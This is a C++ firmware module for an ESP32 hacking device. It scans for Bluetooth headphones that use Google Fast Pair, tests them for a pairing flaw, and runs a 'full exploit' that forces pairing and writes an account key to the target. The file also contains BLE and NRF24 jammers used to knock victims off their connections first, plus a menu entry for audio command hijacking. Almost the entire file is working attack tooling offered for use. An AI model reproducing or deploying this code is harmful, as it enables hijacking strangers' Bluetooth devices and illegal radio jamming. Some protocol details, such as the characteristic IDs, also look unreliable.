#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "fastpair_crypto.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"
#include "modules/NRF24/nrf_jammer_api.h"

extern std::vector<String> fastPairDevices;
extern bool returnToMenu;

#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif

AudioCommandService audioCmd;
FastPairCrypto crypto;

class BLEJammer {
private:
    NimBLEAdvertising* pAdvertising;
    bool isJamming;
    
public:
    BLEJammer() : pAdvertising(nullptr), isJamming(false) {}
    
    void startAdvertisingJam() {
        if(isJamming) return;
        
        NimBLEDevice::init("JAMMER");
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
        
        pAdvertising = NimBLEDevice::getAdvertising();
        
        uint8_t jamData[31];
        memset(jamData, 0xAA, 31);
        
        NimBLEAdvertisementData advertData;
        advertData.setFlags(0x06);
        advertData.addData(jamData, 31);
        
        pAdvertising->setAdvertisementData(advertData);
        pAdvertising->setMinInterval(0x0020);
        pAdvertising->setMaxInterval(0x0040);
        
        pAdvertising->start();
        isJamming = true;
    }
    
    void targetConnectionJam(NimBLEAddress target) {
        NimBLEClient* pClient = NimBLEDevice::createClient();
        
        if(pClient->connect(target, false)) {
            delay(100);
            
            uint8_t garbage[50];
            esp_fill_random(garbage, 50);
            
            for(int i = 0; i < 5; i++) {
                NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1800));
                if(pService) {
                    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x2A00));
                    if(pChar) {
                        pChar->writeValue(garbage, 50, false);
                    }
                }
                delay(50);
            }
            
            pClient->disconnect();
        }
        
        NimBLEDevice::deleteClient(pClient);
    }
    
    void stopJam() {
        if(!isJamming) return;
        
        if(pAdvertising) {
            pAdvertising->stop();
        }
        NimBLEDevice::deinit(true);
        isJamming = false;
    }
    
    bool isActive() { return isJamming; }
    
    ~BLEJammer() {
        stopJam();
    }
};

BLEJammer bleJammer;

int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char* btn2 = "", const char* btn3 = "", uint16_t color = TFT_WHITE, bool showEscHint = true) {
    int buttonCount = 0;
    if(strlen(btn1) > 0) buttonCount++;
    if(strlen(btn2) > 0) buttonCount++;
    if(strlen(btn3) > 0) buttonCount++;

    if(buttonCount == 0) {
        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 80, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        tft.print(line1);

        if(showEscHint) {
            tft.setCursor(20, 120);
            tft.print("Press ESC to exit");
        } else {
            tft.setCursor(20, 120);
            tft.print("Press any key...");
        }

        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(showEscHint == false && (check(SelPress) || check(PrevPress) || check(NextPress))) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else if(buttonCount == 1) {
        const char* buttons[] = {btn1, btn2, btn3};
        const char* actualBtn = "";
        for(int i = 0; i < 3; i++) {
            if(strlen(buttons[i]) > 0) {
                actualBtn = buttons[i];
                break;
            }
        }

        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        tft.print(line1);

        int btnWidth = 100;
        int btnX = (tftWidth - btnWidth) / 2;
        int btnY = 140;

        tft.fillRoundRect(btnX, btnY, btnWidth, 30, 5, bruceConfig.priColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.priColor);

        int textWidth = strlen(actualBtn) * 6;
        int textX = btnX + (btnWidth - textWidth) / 2;
        tft.setCursor(textX, btnY + 10);
        tft.print(actualBtn);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 180);
        tft.print("SEL: Select  ESC: Cancel");

        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(check(SelPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else {
        return displayMessage(line1, btn1, btn2, btn3, color);
    }
}

bool initBLEIfNeeded(const char* deviceName) {
    static bool initialized = false;

    if (!initialized) {
        NimBLEDevice::init(deviceName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
        initialized = true;
    }

    return true;
}

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");

    tft.fillRect(20, 50, tftWidth - 40, 100, bruceConfig.bgColor);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print(message);
    tft.setCursor(20, 100);
    tft.print("Press SEL to confirm");
    tft.setCursor(20, 120);
    tft.print("or ESC to cancel");

    while(true) {
        if(check(EscPress)) {
            showAdaptiveMessage("Cancelled", "OK", "", "", TFT_WHITE);
            return false;
        }
        if(check(SelPress)) {
            showAdaptiveMessage("Confirmed!", "OK", "", "", TFT_WHITE);
            delay(300);
            return true;
        }
        delay(50);
    }
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    showAdaptiveMessage("Connecting to target...", "", "", "", TFT_WHITE, false);

    NimBLEClient* pClient = NimBLEDevice::createClient();

    if(!pClient->connect(target, true)) {
        showAdaptiveMessage("Connection failed", "OK", "", "", TFT_RED);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    showAdaptiveMessage("Connected, discovering...", "", "", "", TFT_WHITE, false);

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        showAdaptiveMessage("Fast Pair service not found", "OK", "", "", TFT_YELLOW);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        showAdaptiveMessage("KBP char not found", "OK", "", "", TFT_YELLOW);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;

    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);

    memcpy(&packet[2], targetBytes, 6);
    esp_fill_random(&packet[8], 8);

    showAdaptiveMessage("Sending test packet...", "", "", "", TFT_WHITE, false);

    if(pChar->writeValue(packet, 16, false)) {
        showAdaptiveMessage("Packet sent, checking...", "", "", "", TFT_WHITE, false);
        delay(100);

        bool vulnerable = pChar->canRead() || pChar->canNotify();
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);

        if(vulnerable) {
            showAdaptiveMessage("DEVICE VULNERABLE!", "OK", "", "", TFT_GREEN);
            return true;
        } else {
            showAdaptiveMessage("No response - may be patched", "OK", "", "", TFT_YELLOW);
            return false;
        }
    }

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
    showAdaptiveMessage("Connecting...", "", "", "", TFT_WHITE, false);

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target, true)) {
        showAdaptiveMessage("Connect failed", "OK", "", "", TFT_RED);
        return false;
    }

    showAdaptiveMessage("Connected, discovering...", "", "", "", TFT_WHITE, false);

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        showAdaptiveMessage("No FastPair service", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        showAdaptiveMessage("No KBP char", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    showAdaptiveMessage("Generating key...", "", "", "", TFT_WHITE, false);

    uint8_t our_pubkey[65];
    size_t pub_len = 65;
    if(!crypto.generateKeyPair(our_pubkey, &pub_len)) {
        showAdaptiveMessage("Key gen failed", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    uint8_t keyExchangeMsg[67] = {0};
    keyExchangeMsg[0] = 0x00;
    keyExchangeMsg[1] = 0x20;
    memcpy(&keyExchangeMsg[2], our_pubkey, 65);

    showAdaptiveMessage("Sending key...", "", "", "", TFT_WHITE, false);

    if(!pKeyChar->writeValue(keyExchangeMsg, 67, false)) {
        showAdaptiveMessage("Send failed", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    delay(100);
    showAdaptiveMessage("Waiting response...", "", "", "", TFT_WHITE, false);

    std::string response = pKeyChar->readValue();
    if(response.length() < 67) {
        showAdaptiveMessage("Bad response", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    const uint8_t* their_pubkey = (const uint8_t*)response.c_str() + 2;
    if(!crypto.computeSharedSecret(their_pubkey, 65)) {
        showAdaptiveMessage("Shared secret failed", "OK", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }

    memcpy(shared_secret, crypto.getSharedSecret(), 32);
    pClient->disconnect();
    return true;
}

bool fastpair_complete_pairing(NimBLEAddress target, const uint8_t* shared_secret) {
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target, true)) return false;

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        return false;
    }

    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        pClient->disconnect();
        return false;
    }

    uint8_t nonce[16];
    esp_fill_random(nonce, 16);

    uint8_t pairingData[50] = {0};
    pairingData[0] = 0x00;
    pairingData[1] = 0x30;
    memcpy(&pairingData[2], nonce, 16);
    memcpy(&pairingData[18], shared_secret, 16);

    if(!pKeyChar->writeValue(pairingData, 34, false)) {
        pClient->disconnect();
        return false;
    }

    delay(100);

    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
    if(pAccountChar) {
        crypto.generateAccountKey();
        pAccountChar->writeValue(crypto.getAccountKey(), 16, true);
    }

    pClient->disconnect();
    return true;
}

bool whisperPairFullExploit(NimBLEAddress target) {
    uint8_t shared_secret[32];

    if(!fastpair_ecdh_key_exchange(target, shared_secret)) return false;
    if(!fastpair_complete_pairing(target, shared_secret)) return false;

    return true;
}

String selectTargetFromScan(const char* title) {
    std::vector<Option> deviceOptions;
    std::vector<NimBLEAdvertisedDevice> foundDevices;
    String selectedMAC = "";
    uint8_t selectedAddrType = BLE_ADDR_PUBLIC;

    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);

    tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Scanning... 20s");
    tft.setCursor(20, 80);
    tft.print("Found: 0");
    tft.setCursor(20, 100);
    tft.print("Press ESC to cancel");

    uint32_t scanStartTime = millis();
    uint32_t scanDuration = 20000;
    bool scanCancelled = false;

    NimBLEDevice::deinit(true);
    NimBLEDevice::init("");

    NimBLEScan* pBLEScan = NimBLEDevice::getScan();
    if (!pBLEScan) {
        showAdaptiveMessage("Scanner init failed", "OK", "", "", TFT_RED);
        return "";
    }

    pBLEScan->clearResults();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(97);
    pBLEScan->setWindow(37);
    pBLEScan->setDuplicateFilter(false);

    class ScanCallback : public NimBLEScanCallbacks {
    private:
        std::vector<NimBLEAdvertisedDevice>* devices;
        uint32_t* foundCount;

    public:
        ScanCallback(std::vector<NimBLEAdvertisedDevice>* devs, uint32_t* count) 
            : devices(devs), foundCount(count) {}

        void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
            devices->push_back(*advertisedDevice);
            (*foundCount)++;
        }
    };

    uint32_t foundCount = 0;
    ScanCallback scanCallback(&foundDevices, &foundCount);
    pBLEScan->setScanCallbacks(&scanCallback);

    pBLEScan->start(scanDuration / 1000, false);

    while(millis() - scanStartTime < scanDuration && !scanCancelled) {
        uint32_t remaining = (scanStartTime + scanDuration - millis()) / 1000;
        tft.fillRect(20, 60, 200, 20, bruceConfig.bgColor);
        tft.setCursor(20, 60);
        tft.print("Scanning... " + String(remaining) + "s");

        tft.fillRect(20, 80, 100, 20, bruceConfig.bgColor);
        tft.setCursor(20, 80);
        tft.print("Found: " + String(foundCount));

        if(check(EscPress)) {
            scanCancelled = true;
            pBLEScan->stop();
            break;
        }

        delay(100);
    }

    pBLEScan->clearResults();

    if(scanCancelled) {
        showAdaptiveMessage("Scan cancelled", "OK", "", "", TFT_YELLOW);
        delay(1000);
        return "";
    }

    tft.fillRect(20, 60, 200, 40, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Scan complete!");
    tft.setCursor(20, 80);
    tft.print("Found: " + String(foundCount));
    delay(1000);

    if(foundCount == 0) {
        showAdaptiveMessage("NO DEVICES FOUND", "OK", "", "", TFT_YELLOW);
        delay(1500);
        return "";
    }

    for(size_t i = 0; i < foundDevices.size(); i++) {
        NimBLEAdvertisedDevice device = foundDevices[i];

        std::string nameStr = device.getName();
        String name = nameStr.empty() ? "Unknown" : String(nameStr.c_str());

        std::string addrStr = device.getAddress().toString();
        String address = String(addrStr.c_str());

        uint8_t addrType = device.getAddressType();
        int rssi = device.getRSSI();

        if(name == "Unknown") {
            name = address;
        }

        String displayText = name;
        if(displayText.length() > 20) {
            displayText = displayText.substring(0, 17) + "...";
        }

        deviceOptions.push_back({displayText.c_str(), [=, &selectedMAC, &selectedAddrType]() {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("DEVICE INFO");
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);

            tft.fillRect(20, 50, tftWidth - 40, 150, bruceConfig.bgColor);

            tft.setCursor(20, 60);
            tft.print("Name: " + name);

            tft.setCursor(20, 90);
            tft.print("MAC: " + address);

            tft.setCursor(20, 120);
            tft.print("RSSI: " + String(rssi) + " dBm");

            tft.setCursor(20, 150);
            tft.print("Type: ");
            if(addrType == BLE_ADDR_PUBLIC) {
                tft.print("Public");
            } else if(addrType == BLE_ADDR_RANDOM) {
                tft.print("Random");
            } else {
                tft.print("Unknown");
            }

            tft.setCursor(20, 190);
            tft.print("SEL: Connect to device");
            tft.setCursor(20, 210);
            tft.print("ESC: Back to list");

            while(true) {
                if(check(EscPress)) {
                    break;
                }
                if(check(SelPress)) {
                    selectedMAC = address;
                    selectedAddrType = addrType;
                    break;
                }
                delay(50);
            }
        }});
    }

    deviceOptions.push_back({"[Back]", []() {}});

    if(deviceOptions.size() > 1) {
        loopOptions(deviceOptions, MENU_TYPE_SUBMENU, "SELECT DEVICE", 0, false);
    }

    if(!selectedMAC.isEmpty()) {
        return selectedMAC + ":" + String(selectedAddrType);
    }

    return "";
}

void testFastPairVulnerability() {
    initBLEIfNeeded("Bruce-WP");

    String selectedInfo = selectTargetFromScan("FAST PAIR SCAN");
    if(selectedInfo.isEmpty()) return;

    int colonPos = selectedInfo.lastIndexOf(':');
    if(colonPos == -1) {
        showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
        return;
    }

    String selectedMAC = selectedInfo.substring(0, colonPos);
    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();

    NimBLEAddress target;
    try {
        target = NimBLEAddress(selectedMAC.c_str(), addrType);
    } catch (...) {
        showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
        return;
    }

    if(!requireSimpleConfirmation("Test vulnerability?")) return;

    bool vulnerable = attemptKeyBasedPairing(target);

    delay(2000);
}

void disconnectAndExploit(NimBLEAddress target, bool useNRF24 = false) {
    if(useNRF24) {
        if(isNRF24Available()) {
            showAdaptiveMessage("NRF24 Jammer starting...", "", "", "", TFT_YELLOW, false);
            startJammer();
            showAdaptiveMessage("NRF24 JAMMING", "Jamming for 3s...", "", "", TFT_YELLOW, false);
            delay(3000);
        } else {
            showAdaptiveMessage("NRF24 module not found", "Using BLE jammer", "", "", TFT_YELLOW);
            useNRF24 = false;
        }
    }
    
    if(!useNRF24) {
        showAdaptiveMessage("Starting BLE jam...", "", "", "", TFT_YELLOW, false);
        bleJammer.startAdvertisingJam();
        delay(2000);
        bleJammer.stopJam();
        delay(500);
    }

    showAdaptiveMessage("Attempting connection...", "", "", "", TFT_WHITE, false);

    NimBLEClient* pClient = NimBLEDevice::createClient();

    if(pClient->connect(target, true)) {
        showAdaptiveMessage("Connected! Running exploit...", "", "", "", TFT_WHITE, false);

        if(useNRF24) {
            stopJammer();
        }

        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
        if(pService) {
            NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
            if(pChar) {
                uint8_t packet[16] = {0};
                packet[0] = 0x00;
                packet[1] = 0x11;

                uint8_t targetBytes[6];
                std::string macStr = target.toString();
                sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &targetBytes[5], &targetBytes[4], &targetBytes[3],
                       &targetBytes[2], &targetBytes[1], &targetBytes[0]);

                memcpy(&packet[2], targetBytes, 6);
                esp_fill_random(&packet[8], 8);

                if(pChar->writeValue(packet, 16, false)) {
                    delay(100);
                    bool vulnerable = pChar->canRead() || pChar->canNotify();
                    pClient->disconnect();

                    if(vulnerable) {
                        showAdaptiveMessage("DEVICE VULNERABLE!", "OK", "", "", TFT_GREEN);
                    } else {
                        showAdaptiveMessage("No response", "Device may be patched", "OK", "", TFT_YELLOW);
                    }
                } else {
                    showAdaptiveMessage("Failed to send packet", "OK", "", "", TFT_RED);
                }
            } else {
                showAdaptiveMessage("KBP char not found", "OK", "", "", TFT_YELLOW);
            }
        } else {
            showAdaptiveMessage("Fast Pair service not found", "OK", "", "", TFT_YELLOW);
        }

        pClient->disconnect();
    } else {
        if(useNRF24) {
            stopJammer();
        }
        showAdaptiveMessage("Still connected elsewhere", "Try manual disconnect", "OK", "", TFT_RED);
    }

    NimBLEDevice::deleteClient(pClient);
}

void bleJammerMenu() {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("BLE JAMMER");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    
    if(bleJammer.isActive()) {
        tft.print("Status: ACTIVE");
        tft.setCursor(20, 90);
        tft.print("1. Stop BLE Jammer");
    } else {
        tft.print("Status: INACTIVE");
        tft.setCursor(20, 90);
        tft.print("1. Start BLE Jammer");
    }

    tft.setCursor(20, 120);
    tft.print("2. Target Connection Jam");
    tft.setCursor(20, 150);
    tft.print("3. Test Jam & Scan");
    tft.setCursor(20, 190);
    tft.print("SEL: Select  ESC: Back");

    int selection = 0;
    bool redraw = true;

    while(true) {
        if(check(EscPress)) return;

        if(redraw) {
            tft.fillRect(20, 210, tftWidth - 40, 30, bruceConfig.bgColor);
            tft.setCursor(20, 210);
            if(selection == 0) tft.print(">> " + String(bleJammer.isActive() ? "Stop BLE Jammer" : "Start BLE Jammer"));
            else if(selection == 1) tft.print(">> Target Connection Jam");
            else tft.print(">> Test Jam & Scan");
            redraw = false;
        }

        if(check(PrevPress)) {
            if(selection > 0) {
                selection--;
                redraw = true;
            }
        }
        if(check(NextPress)) {
            if(selection < 2) {
                selection++;
                redraw = true;
            }
        }

        if(check(SelPress)) {
            if(selection == 0) {
                if(bleJammer.isActive()) {
                    bleJammer.stopJam();
                    showAdaptiveMessage("BLE Jammer STOPPED", "OK", "", "", TFT_WHITE);
                } else {
                    bleJammer.startAdvertisingJam();
                    showAdaptiveMessage("BLE Jammer STARTED", "OK", "", "", TFT_GREEN);
                }
            }
            else if(selection == 1) {
                String selectedInfo = selectTargetFromScan("SELECT TARGET");
                if(!selectedInfo.isEmpty()) {
                    int colonPos = selectedInfo.lastIndexOf(':');
                    String selectedMAC = selectedInfo.substring(0, colonPos);
                    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
                    NimBLEAddress target(selectedMAC.c_str(), addrType);

                    bleJammer.targetConnectionJam(target);
                    showAdaptiveMessage("Connection Jam Attempted", "OK", "", "", TFT_YELLOW);
                }
            }
            else {
                showAdaptiveMessage("Starting BLE jam...", "Scanning in 2s", "", "", TFT_YELLOW, false);
                bleJammer.startAdvertisingJam();
                delay(2000);
                bleJammer.stopJam();
                delay(500);

                String selectedInfo = selectTargetFromScan("POST-JAM SCAN");

                if(!selectedInfo.isEmpty()) {
                    int colonPos = selectedInfo.lastIndexOf(':');
                    String selectedMAC = selectedInfo.substring(0, colonPos);
                    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
                    NimBLEAddress target(selectedMAC.c_str(), addrType);

                    if(requireSimpleConfirmation("Run exploit on device?")) {
                        disconnectAndExploit(target, false);
                    }
                }
            }
            return;
        }
        delay(50);
    }
}

void nrf24JammerMenu() {
    if(!isNRF24Available()) {
        showAdaptiveMessage("NRF24 module not found", "Connect module and restart", "OK", "", TFT_RED);
        return;
    }
    
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("NRF24 JAMMER");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("NRF24L01+ Module");
    tft.setCursor(20, 90);
    tft.print("Status: READY");
    tft.setCursor(20, 120);
    tft.print("1. Start NRF24 Jammer");
    tft.setCursor(20, 150);
    tft.print("2. Stop NRF24 Jammer");
    tft.setCursor(20, 180);
    tft.print("3. Jam & Scan Mode");
    tft.setCursor(20, 210);
    tft.print("SEL: Select  ESC: Back");

    int selection = 0;
    bool redraw = true;

    while(true) {
        if(check(EscPress)) return;

        if(redraw) {
            tft.fillRect(20, 230, tftWidth - 40, 30, bruceConfig.bgColor);
            tft.setCursor(20, 230);
            if(selection == 0) tft.print(">> Start NRF24 Jammer");
            else if(selection == 1) tft.print(">> Stop NRF24 Jammer");
            else tft.print(">> Jam & Scan Mode");
            redraw = false;
        }

        if(check(PrevPress)) {
            if(selection > 0) {
                selection--;
                redraw = true;
            }
        }
        if(check(NextPress)) {
            if(selection < 2) {
                selection++;
                redraw = true;
            }
        }

        if(check(SelPress)) {
            if(selection == 0) {
                startJammer();
                showAdaptiveMessage("NRF24 Jammer STARTED", "OK", "", "", TFT_GREEN);
            }
            else if(selection == 1) {
                stopJammer();
                showAdaptiveMessage("NRF24 Jammer STOPPED", "OK", "", "", TFT_WHITE);
            }
            else if(selection == 2) {
                showAdaptiveMessage("Starting jammer...", "Scanning in 3s", "", "", TFT_YELLOW, false);
                startJammer();
                delay(3000);

                String selectedInfo = selectTargetFromScan("JAM & SCAN MODE");

                stopJammer();

                if(!selectedInfo.isEmpty()) {
                    int colonPos = selectedInfo.lastIndexOf(':');
                    String selectedMAC = selectedInfo.substring(0, colonPos);
                    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
                    NimBLEAddress target(selectedMAC.c_str(), addrType);

                    if(requireSimpleConfirmation("Run exploit on device?")) {
                        disconnectAndExploit(target, true);
                    }
                }
            }
            return;
        }
        delay(50);
    }
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;

    options.push_back({"[Scan & Test]", []() {
        testFastPairVulnerability();
    }});

    options.push_back({"[Full Pair Test]", []() {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("FULL PAIR EXPLOIT");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(1);

        tft.fillRect(20, 50, tftWidth - 40, 150, bruceConfig.bgColor);

        int lineHeight = 18;
        int startY = 50;

        tft.setCursor(20, startY);
        tft.print("This will attempt full pairing:");

        tft.setCursor(20, startY + lineHeight);
        tft.print("1. Connect to target");

        tft.setCursor(20, startY + (lineHeight * 2));
        tft.print("2. ECDH key exchange");

        tft.setCursor(20, startY + (lineHeight * 3));
        tft.print("3. Complete pairing");

        tft.setCursor(20, startY + (lineHeight * 4));
        tft.print("4. Store account key");

        tft.fillRect(20, startY + (lineHeight * 5) + 10, tftWidth - 40, 30, bruceConfig.bgColor);
        String prompt = "Press SEL to continue - ESC to cancel";
        int textWidth = prompt.length() * 6;
        int centerX = (tftWidth - textWidth) / 2;
        if (centerX < 20) centerX = 20;
        tft.setCursor(centerX, startY + (lineHeight * 5) + 10);
        tft.print(prompt);

        while(true) {
            if(check(EscPress)) return;
            if(check(SelPress)) break;
            delay(50);
        }

        String selectedInfo = selectTargetFromScan("SELECT TARGET");
        if(selectedInfo.isEmpty()) return;

        int colonPos = selectedInfo.lastIndexOf(':');
        if(colonPos == -1) {
            showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
            return;
        }

        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();

        NimBLEAddress target;
        try {
            target = NimBLEAddress(selectedMAC.c_str(), addrType);
        } catch (...) {
            showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
            return;
        }

        int8_t confirm = displayMessage("Confirm full exploit?", "No", "Yes", "Back", TFT_YELLOW);
        if(confirm != 1) return;

        bool success = whisperPairFullExploit(target);
        if(success) {
            showAdaptiveMessage("EXPLOIT SUCCESSFUL!", "OK", "", "", TFT_GREEN);
        } else {
            showAdaptiveMessage("Exploit failed", "OK", "", "", TFT_RED);
        }
    }});

    options.push_back({"[Force Disconnect & Test]", []() {
        initBLEIfNeeded("Bruce-WP-JAM");

        String selectedInfo = selectTargetFromScan("SELECT TARGET");
        if(selectedInfo.isEmpty()) return;

        int colonPos = selectedInfo.lastIndexOf(':');
        if(colonPos == -1) {
            showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
            return;
        }

        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();

        NimBLEAddress target;
        try {
            target = NimBLEAddress(selectedMAC.c_str(), addrType);
        } catch (...) {
            showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
            return;
        }

        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("SELECT JAMMER");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 60);
        tft.print("Which jammer to use?");
        
        if(isNRF24Available()) {
            tft.setCursor(20, 90);
            tft.print("1. NRF24 (better)");
            tft.setCursor(20, 120);
            tft.print("2. BLE (fallback)");
        } else {
            tft.setCursor(20, 90);
            tft.print("NRF24 not detected");
            tft.setCursor(20, 120);
            tft.print("Using BLE jammer");
            delay(1500);
            disconnectAndExploit(target, false);
            return;
        }
        
        tft.setCursor(20, 160);
        tft.print("SEL: Select  ESC: Cancel");

        int jammerChoice = 0;
        bool redraw = true;

        while(true) {
            if(check(EscPress)) return;

            if(redraw) {
                tft.fillRect(20, 180, tftWidth - 40, 30, bruceConfig.bgColor);
                tft.setCursor(20, 180);
                if(jammerChoice == 0) tft.print(">> NRF24 Jammer");
                else tft.print(">> BLE Jammer");
                redraw = false;
            }

            if(check(PrevPress) || check(NextPress)) {
                jammerChoice = 1 - jammerChoice;
                redraw = true;
            }

            if(check(SelPress)) {
                bool useNRF24 = (jammerChoice == 0);

                if(useNRF24) {
                    if(!requireSimpleConfirmation("Use NRF24 jammer?")) return;
                } else {
                    if(!requireSimpleConfirmation("Use BLE jammer?")) return;
                }

                disconnectAndExploit(target, useNRF24);
                return;
            }
            delay(50);
        }
    }});

    options.push_back({"[Audio CMD Hijack]", []() {
        audioCommandHijackTest();
    }});

    options.push_back({"[NRF24 Jammer]", []() {
        nrf24JammerMenu();
    }});

    options.push_back({"[BLE Jammer]", []() {
        bleJammerMenu();
    }});

    options.push_back({"[Back]", []() { returnToMenu = true; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}